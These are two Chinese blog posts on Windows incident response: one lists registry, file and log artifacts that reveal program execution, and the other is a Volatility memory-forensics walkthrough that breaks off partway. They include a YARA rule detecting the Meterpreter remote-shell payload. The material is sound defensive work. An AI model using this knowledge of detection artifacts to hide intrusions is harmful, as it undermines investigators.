+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/17/取证分析之发现Windows恶意程序执行痕迹/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/17/取证分析之发现Windows恶意程序执行痕迹/" itemprop="url">取证分析之发现Windows恶意程序执行痕迹</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-17T08:32:33+08:00">
+                2019-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/应急响应/" itemprop="url" rel="index">
+                    <span itemprop="name">应急响应</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>2018-10-29 首发于阿里先知: <a href="https://xz.aliyun.com/t/3067" target="_blank" rel="noopener">https://xz.aliyun.com/t/3067</a></p>
+<p>本文主要简述当Windows系统中存在恶意可执行程序时，如何发现恶意程序的执行痕迹（文件路径、时间等），以及相关的辅助分析工具。<br>从注册表、文件、日志三个方面介绍，以及简单介绍下Win10中的几个特有功能。</p>
+<h3 id="一、注册表"><a href="#一、注册表" class="headerlink" title="一、注册表"></a>一、注册表</h3><h4 id="1-ShimCache"><a href="#1-ShimCache" class="headerlink" title="1)ShimCache"></a>1)ShimCache</h4><p>ShimCache 又称为AppCompatCache，从 Windows XP开始存在，用来识别应用程序兼容性问题。跟踪文件路径，大小和上次修改时间（LastModifiedTime）和上次更新时间（LastUpdateTime）。<br>其中在Windows7/8/10系统中最多包含1024条记录，Windows7/8/10系统中不存在“上次更新时间”。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182010-e26034c0-d9d1-1.png" alt=""></p>
+<h5 id="辅助工具AppCompatCacheParser"><a href="#辅助工具AppCompatCacheParser" class="headerlink" title="辅助工具AppCompatCacheParser"></a>辅助工具AppCompatCacheParser</h5><p><a href="https://github.com/EricZimmerman/AppCompatCacheParser/" target="_blank" rel="noopener">https://github.com/EricZimmerman/AppCompatCacheParser/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">AppCompatCacheParser.exe --csv d:\temp  -t</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182152-1f1ba99e-d9d2-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182204-2689023a-d9d2-1.png" alt=""></p>
+<h5 id="辅助工具ShimCacheParser"><a href="#辅助工具ShimCacheParser" class="headerlink" title="辅助工具ShimCacheParser"></a>辅助工具ShimCacheParser</h5><p><a href="https://github.com/mandiant/ShimCacheParser" target="_blank" rel="noopener">https://github.com/mandiant/ShimCacheParser</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">reg export &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache&quot; shimcache.reg</span><br><span class="line">ShimCacheParser.py -o out.csv -r D:\Tool\TEST\shimcache.reg -t</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182432-7ebb7ff0-d9d2-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182443-851cca34-d9d2-1.png" alt=""></p>
+<h4 id="2-UserAssist"><a href="#2-UserAssist" class="headerlink" title="2)UserAssist"></a>2)UserAssist</h4><p>userassist键值包含GUI应用执行的信息，如名称、路径、关联快捷方式、执行次数、上一次执行时间等。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\&#123;GUID&#125;\Count</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182646-cea366e0-d9d2-1.png" alt="image.png"></p>
+<h5 id="辅助工具UserAssist-V2-6-0"><a href="#辅助工具UserAssist-V2-6-0" class="headerlink" title="辅助工具UserAssist_V2_6_0"></a>辅助工具UserAssist_V2_6_0</h5><p><a href="https://blog.didierstevens.com/programs/userassist/" target="_blank" rel="noopener">https://blog.didierstevens.com/programs/userassist/</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182827-0aeb287c-d9d3-1.png" alt="image.png"></p>
+<h4 id="3-MUICache"><a href="#3-MUICache" class="headerlink" title="3)MUICache"></a>3)MUICache</h4><p>MUICache记录执行程序的名称和路径，但是没有记录相关执行时间。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKCU/Software/Microsoft/Windows/ShellNoRoam/MUICache (XP, 2000, 2003) </span><br><span class="line">HKCU/Software/Classes/Local Settings/Software/Microsoft/Windows/Shell/MuiCache  (Vista, 7, 2008)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183121-721a720a-d9d3-1.png" alt="image.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183131-786d3822-d9d3-1.png" alt="image.png"></p>
+<h5 id="辅助工具muicache-view"><a href="#辅助工具muicache-view" class="headerlink" title="辅助工具muicache_view"></a>辅助工具muicache_view</h5><p><a href="http://www.nirsoft.net/utils/muicache_view.html" target="_blank" rel="noopener">http://www.nirsoft.net/utils/muicache_view.html</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183158-8882060c-d9d3-1.png" alt="image.png"></p>
+<h3 id="二、文件"><a href="#二、文件" class="headerlink" title="二、文件"></a>二、文件</h3><h4 id="1-Prefetch"><a href="#1-Prefetch" class="headerlink" title="1)Prefetch"></a>1)Prefetch</h4><p>Prefetch（预读取），从Windows XP开始引入，用来加速应用程序启动过程。Prefetch包含可执行文件的名称、文件时间戳、运行次数、上次执行时间、Hash等。<br>Win7上记录最近128个可执行文件的信息，Win8-10上的最近1024个可执行文件。</p>
+<p>文件路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Prefetch</span><br></pre></td></tr></table></figure></p>
+<p>注册表HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters  中EnablePrefetcher的键值控制是否开启Prefetch。<br>EnablePrefetcher的数值设置：<br>0 =已禁用<br>1 =启用应用程序预读取<br>2 =启用引导预读取<br>3 =启用应用程序和引导预读取（最佳和默认）<br>虽然Windows 2003中也存在Prefetch，但默认为2,仅用于引导预读取。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183526-044c3d66-d9d4-1.png" alt="image.png"></p>
+<h5 id="辅助工具PECmd"><a href="#辅助工具PECmd" class="headerlink" title="辅助工具PECmd"></a>辅助工具PECmd</h5><p><a href="https://github.com/EricZimmerman/PECmd" target="_blank" rel="noopener">https://github.com/EricZimmerman/PECmd</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">PECmd.exe -d &quot;C:\Windows\Prefetch&quot; --csv &quot;d:\temp&quot; --json d:\temp\json</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183717-46713b10-d9d4-1.png" alt="image.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183726-4becd87e-d9d4-1.png" alt="image.png"></p>
+<h4 id="2-Amcache"><a href="#2-Amcache" class="headerlink" title="2)Amcache"></a>2)Amcache</h4><p>Amcache.hve记录执应用程序的执行路径、上次执行时间、以及SHA1值。<br>文件路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\AppCompat\Programs\Amcache.hve</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183739-537a5f6c-d9d4-1.png" alt="image.png"></p>
+<h4 id="辅助工具AmcacheParse"><a href="#辅助工具AmcacheParse" class="headerlink" title="辅助工具AmcacheParse"></a>辅助工具AmcacheParse</h4><p><a href="https://github.com/EricZimmerman/AmcacheParser" target="_blank" rel="noopener">https://github.com/EricZimmerman/AmcacheParser</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">AmcacheParser.exe -f C:\Windows\AppCompat\Programs\Amcache.hve --csv d:\temp</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183822-6d073a72-d9d4-1.png" alt="image.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183830-724ff78a-d9d4-1.png" alt="image.png"></p>
+<h4 id="3-Jump-Lists"><a href="#3-Jump-Lists" class="headerlink" title="3)Jump Lists"></a>3)Jump Lists</h4><p>Windows 7-10用来任务栏显示经常使用或最近使用的项目。<br>文件路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183913-8bfec36e-d9d4-1.png" alt="image.png"></p>
+<h4 id="辅助工具JumpListExplorer"><a href="#辅助工具JumpListExplorer" class="headerlink" title="辅助工具JumpListExplorer"></a>辅助工具JumpListExplorer</h4><p><a href="https://ericzimmerman.github.io/Software/JumpListExplorer.zip" target="_blank" rel="noopener">https://ericzimmerman.github.io/Software/JumpListExplorer.zip</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183942-9d0f0a88-d9d4-1.png" alt="image.png"></p>
+<h3 id="三、日志"><a href="#三、日志" class="headerlink" title="三、日志"></a>三、日志</h3><h4 id="1-安全事件日志Security-Log-592-4688"><a href="#1-安全事件日志Security-Log-592-4688" class="headerlink" title="1) 安全事件日志Security Log (592/4688)"></a>1) 安全事件日志Security Log (592/4688)</h4><p>Windows 7、Windows Server 2008 R2 /2012 及之后，会在每次创建一个进程时创建一个事件日志，并传递到该进程的命令行信息。事件将记录到现有事件 ID 4688 并保存到 Windows 安全日志。但仅在启用了“审核进程创建”时记录4688。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">592   创建一个新进程（Windows Server 2003）</span><br><span class="line">4688  创建一个新进程（Windows 7、Windows Server 2008 R2/ 2012及之后）</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027184400-36f3f80c-d9d5-1.png" alt="image.png"></p>
+<h4 id="2-系统事件日志System-Log-7035-7036"><a href="#2-系统事件日志System-Log-7035-7036" class="headerlink" title="2) 系统事件日志System Log (7035/7036)"></a>2) 系统事件日志System Log (7035/7036)</h4><p>Windows XP/7/ Windows Server 2003,当服务启动或停止时，服务控制管理器会记录到系统事件日志中的ID 7035。因此，如果关联的进程被注册为服务，则可发现执行痕迹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7035   Service Control Manager    xxx服务成功发送一个开始控件。</span><br><span class="line">7036   Service Control Manager    xxx服务处于 正在运行/停止 状态</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027184413-3e5efc9a-d9d5-1.png" alt="image.png"></p>
+<h4 id="3-计划任务日志TaskScheduler"><a href="#3-计划任务日志TaskScheduler" class="headerlink" title="3) 计划任务日志TaskScheduler"></a>3) 计划任务日志TaskScheduler</h4><p>计划任务日志中也可能发现可执行文件执行的痕迹。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027184424-452b0906-d9d5-1.png" alt="image.png"></p>
+<h3 id="四、Win10特有功能"><a href="#四、Win10特有功能" class="headerlink" title="四、Win10特有功能"></a>四、Win10特有功能</h3><h4 id="1-RecentApps（win10）"><a href="#1-RecentApps（win10）" class="headerlink" title="1) RecentApps（win10）"></a>1) RecentApps（win10）</h4><p>Windows 10<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\Current Version\Search\RecentApps</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-BAM-Background-Activity-Monitor-win10"><a href="#2-BAM-Background-Activity-Monitor-win10" class="headerlink" title="2) BAM/Background Activity Monitor (win10)"></a>2) BAM/Background Activity Monitor (win10)</h4><p>从Windows 10 1709 (Fall Creators update)版本开始引用。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\&#123;SID&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="3-ActivitiesCache-db（win10）"><a href="#3-ActivitiesCache-db（win10）" class="headerlink" title="3) ActivitiesCache.db（win10）"></a>3) ActivitiesCache.db（win10）</h4><p>从Windows 10 1803 (April 2018)版本开始引用。<br>文件路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;profile&gt;\AppData\Local\ConnectedDevicesPlatform\L.&lt;profile&gt;\ActivitiesCache.db</span><br></pre></td></tr></table></figure></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.1234n6.com/2018/10/available-artifacts-evidence-of.html?m=1" target="_blank" rel="noopener">https://blog.1234n6.com/2018/10/available-artifacts-evidence-of.html?m=1</a><br><a href="https://www.andreafortuna.org/dfir/forensic-artifacts-evidences-of-program-execution-on-windows-systems/" target="_blank" rel="noopener">https://www.andreafortuna.org/dfir/forensic-artifacts-evidences-of-program-execution-on-windows-systems/</a><br><a href="https://www.fireeye.com/blog/threat-research/2013/08/execute.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2013/08/execute.html</a><br><a href="https://www.andreafortuna.org/cybersecurity/amcache-and-shimcache-in-forensic-analysis/" target="_blank" rel="noopener">https://www.andreafortuna.org/cybersecurity/amcache-and-shimcache-in-forensic-analysis/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/17/利用Volatility进行入侵痕迹分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/17/利用Volatility进行入侵痕迹分析/" itemprop="url">利用Volatility进行入侵痕迹分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-17T08:32:33+08:00">
+                2019-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/应急响应/" itemprop="url" rel="index">
+                    <span itemprop="name">应急响应</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>2018-07-28 首发于阿里先知: <a href="https://xz.aliyun.com/t/2497" target="_blank" rel="noopener">https://xz.aliyun.com/t/2497</a></p>
+<p><strong>0x00前言</strong></p>
+<p>本文利用Volatility进行内存取证，分析入侵攻击痕迹，包括网络连接、进程、服务、驱动模块、DLL、handles、检测进程注入、检测Meterpreter、cmd历史命令、IE浏览器历史记录、启动项、用户、shimcache、userassist、部分rootkit隐藏文件、cmdliner等。</p>
+<p>环境准备：<br>Kali2中自带Volatility（版本2.4），可下载最新版本2.6，下载即可使用。<br>下载地址：<a href="https://github.com/volatilityfoundation/volatility" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility</a><br>windows系统可使用DumpIt等制作镜像。</p>
+<p>本为以window系统镜像为例，简单模拟了一次入侵行为，然后利用Volatility进行分析：</p>
+<p><strong>0x01查看网络连接</strong><br>netscan 查看网络连接情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 netscan</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132633-ca6189c0-9226-1.png" alt=""></p>
+<p><strong>0x02查看进程</strong></p>
+<p>pslist、psxview可查看进程，其中psxview可查看一些隐藏进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 pslist</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 psxview</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132633-ca8034ec-9226-1.png" alt=""></p>
+<p><strong>0x03查找进程注入</strong><br>malfind 查找隐藏或注入的代码/ DLL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 malfind</span><br></pre></td></tr></table></figure></p>
+<p>可看到进程pid为620的svchost.exe存在异常：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132633-ca948d52-9226-1.png" alt=""></p>
+<p><strong>0x04提取文件</strong></p>
+<p>memdump 提取进程在内存中的信息保存到文件中 –D 指定保存的目录<br>procdump 提取进程的可执行文件<br>提取出文件后，可以到<a href="http://www.virustotal.com进行检验" target="_blank" rel="noopener">www.virustotal.com进行检验</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 procdump -p 620 -D dump</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 memdump -p 620 -D dump   #时间较长，文件较大</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-caa34cfc-9226-1.png" alt=""><br> 成功检测出提取的文件有Meterpreter攻击痕迹：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cab86f92-9226-1.png" alt=""></p>
+<p><strong>0x05yarascan 检测Meterpreter</strong><br>上面通过memdump 提取pid为620的进程，可检测出Meterpreter攻击痕迹，还可以通过YARA进行检测。yarascan 可利用YARA规则进行检测 -Y 指定自定义的规则，-y 指定包含YARA规则。通过文章（<a href="http://cyberforensicator.com/2018/03/11/finding-metasploits-meterpreter-traces-with-memory-forensics/）" target="_blank" rel="noopener">http://cyberforensicator.com/2018/03/11/finding-metasploits-meterpreter-traces-with-memory-forensics/）</a> 的规则学习，可进行检测Meterpreter攻击痕迹。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 yarascan -y fm.yara</span><br></pre></td></tr></table></figure>
+<p>fm.yara文件如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rule Find_Meterpreter</span><br><span class="line">&#123;</span><br><span class="line">	meta:</span><br><span class="line">		desrciption = &quot;it&apos;s the Meterpreter!&quot;</span><br><span class="line">	strings:</span><br><span class="line">		$a = &#123; 6D 65 74 73 72 76 2E 64 6C 6C 00 00 52 65 66 6C 65 63 74 69 76 65 4C 6F 61 64 65 72 &#125;</span><br><span class="line">		$b = &quot;stdapi_&quot; ascii nocase</span><br><span class="line"></span><br><span class="line">	condition:</span><br><span class="line">		$a and $b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cac83f44-9226-1.png" alt=""><br>成功检测到Meterpreter攻击痕迹：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cae0098a-9226-1.png" alt=""></p>
+<p><strong>0x06查看&amp;提取DLL</strong></p>
+<p>dlllist 查看dll文件<br>ldrmodules 可查看一些隐藏的dll<br>dlldump 提取dll文件<br>提取出dll文件后，可以到<a href="http://www.virustotal.com进行检验" target="_blank" rel="noopener">www.virustotal.com进行检验</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 dlllist -p 1656</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 dlldump -p 1656 -D dump</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 ldrmodules</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-caf900de-9226-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cb0c2204-9226-1.png" alt=""><br>成功检测出提取出来的可疑dll文件：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cb1e015e-9226-1.png" alt=""></p>
+<p><strong>0x07查看文件句柄</strong><br>handles 查看进程打开的handles<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 handles -p 620 -t file</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb367b76-9226-1.png" alt=""></p>
+<p><strong>0x08查看cmd历史命令</strong></p>
+<p>cmdscan   查看内存中保留的 cmd 命令使用情况，还可以看到powershell命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 cmdscan</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb4abf1e-9226-1.png" alt=""></p>
+<p><strong>0x09查看IE浏览器历史记录</strong></p>
+<p>1）iehistory插件<br>iehistory  可查看IE浏览中的历史记录，但是有时会出bug，查看不到信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180410-073551.raw --profile=Win7SP1x86 iehistory</span><br></pre></td></tr></table></figure></p>
+<p>2）yarascan搜索记录<br>可以先找到iexplore进程，然后通过yarascan来定义YARA规则进行搜索IE浏览器历史记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180410-073551.raw --profile=Win7SP1x86 pslist | grep iexplore</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180410-073551.raw --profile=Win7SP1x86 yarascan -Y &quot;/(URL|REDR|LEAK)/&quot; -p 1904,220,3276,3676</span><br></pre></td></tr></table></figure></p>
+<p>查看iexplore进程pid：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb5ff0e6-9226-1.png" alt=""><br>成功检测到ie历史记录：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb716ae2-9226-1.png" alt=""></p>
+<p>3）memdump &amp; strings提取记录<br>还可以通过memdump提取iexplore进程中的信息到文件中，然后通过strings来搜索IE浏览器历史记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180410-073551.raw --profile=Win7SP1x86 memdump -p 1904,220,3276,3676 -D dump</span><br><span class="line">strings dump/1904.dmp | grep -i http:// | sort | uniq -u</span><br></pre></td></tr></table></figure></p>
+<p>根据pid提取iexplore进程文件：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb826edc-9226-1.png" alt=""><br>strings成功提取到ie历史记录：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb97fdd8-9226-1.png" alt=""></p>
+<p><strong>0x10查看注册表</strong><br>printkey可查看指定注册表项信息<br>1）查看启动项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 printkey -K &quot;Microsoft\Windows\CurrentVersion\Run&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cbaf60f4-9226-1.png" alt=""></p>
+<p>2）查看用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cbc1e238-9226-1.png" alt=""></p>
+<p>3）shimcache信息查看</p>
+<p>ShimCache来识别应用程序兼容性问题。跟踪文件路径，大小，最后修改时间和最后“执行”时间。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 shimcache</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132636-cbd7f460-9226-1.png" alt=""></p>
